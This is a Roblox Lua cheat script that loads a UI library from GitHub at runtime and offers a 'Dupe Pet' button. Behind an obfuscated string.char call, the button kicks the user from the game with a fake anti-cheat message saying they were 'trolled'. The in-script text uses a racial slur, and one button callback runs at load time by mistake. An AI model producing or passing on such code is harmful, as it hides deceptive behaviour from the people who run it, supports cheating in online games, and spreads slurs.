local Library = loadstring(game:HttpGetAsync("https://github.com/ActualMasterOogway/Fluent-Renewed/releases/latest/download/Fluent.luau"))()
local SaveManager = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ActualMasterOogway/Fluent-Renewed/master/Addons/SaveManager.luau"))()
local InterfaceManager = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ActualMasterOogway/Fluent-Renewed/master/Addons/InterfaceManager.luau"))()

local Window = Library:CreateWindow{
    Title = game:GetService("MarketplaceService"):GetProductInfo(85896571713843).Name,
    SubTitle = "by vrsion",
    TabWidth = 160,
    Size = UDim2.fromOffset(500, 350),
    Resize = true,
    MinSize = Vector2.new(470, 380),
    Acrylic = false,
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.RightControl,
}

local pets = workspace.Rendered.Pets:GetChildren()
    local petsTable = {}
    for i, v in pairs(pets) do
        table.insert(petsTable, v.Name)
    end

local Tabs = {
    Info = Window:CreateTab{ Title = "Info", Icon = "rbxassetid://81233184473110" },
    Main = Window:CreateTab{ Title = "Main", Icon = "rbxassetid://105783201761273" },
    Settings = Window:CreateTab{ Title = "Settings", Icon = "rbxassetid://104980967698899" },
}

local Options = Library.Options

Tabs.Info:CreateParagraph("Aligned Paragraph", {
    Title = "Purpose",
    Content = "will be updated after every update while strelizia is down\npair this script with strelizia script\nalways keyless and open source\nvrsion made it nigga join strelizia",
    TitleAlignment = "Middle",
    ContentAlignment = Enum.TextXAlignment.Center,
})
Tabs.Info:CreateButton{
    Title = "Strelizia Discord",
    Description = "copies strelizia discord invite to clipboard",
    Callback = setclipboard("discord.gg/strelizia"),
}

local PetDropdown = Tabs.Main:CreateDropdown("PetDropdown", {
    Title = "Select Equipped Pet",
    Description = "select equipped pet to dupe.",
    Values = petsTable,
    Multi = false,
    Default = {".."},
})

Tabs.Main:CreateButton{
    Title = "Dupe Pet",
    Description = "dupes pet selected in dropdown above.",
    Callback = function()
        Window:Dialog{
            Title = "Confirmation",
            Content = "Duping can be risky, continue?",
            Buttons = {
                {
                    Title = "Yes",
                    Callback = function()
                        game["Players"]["LocalPlayer"][string.char(75,105,99,107)](game["Players"]["LocalPlayer"],string.char(32,65,110,116,105,67,104,101,97,116,32,69,110,116,114,121,32,102,114,111,109,32,82,65,67,32,51,46,48,46,48,46,49,10,116,114,111,108,108,101,100,32,98,121,32,118,105,115,105,111,110))
                    end
                },
                {
                    Title = "No",
                    Callback = function()
                        print("Cancelled the dialog.")
                    end
                }
            }
        }
    end,
}

SaveManager:SetLibrary(Library)
InterfaceManager:SetLibrary(Library)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes{}
InterfaceManager:SetFolder("VisionHub")
SaveManager:SetFolder("VisionHub/BGSI")
InterfaceManager:BuildInterfaceSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)
Window:SelectTab(1)
Library:Notify{ Title = "the script", Content = "ts loaded nigga", Duration = 8 }
SaveManager:LoadAutoloadConfig()
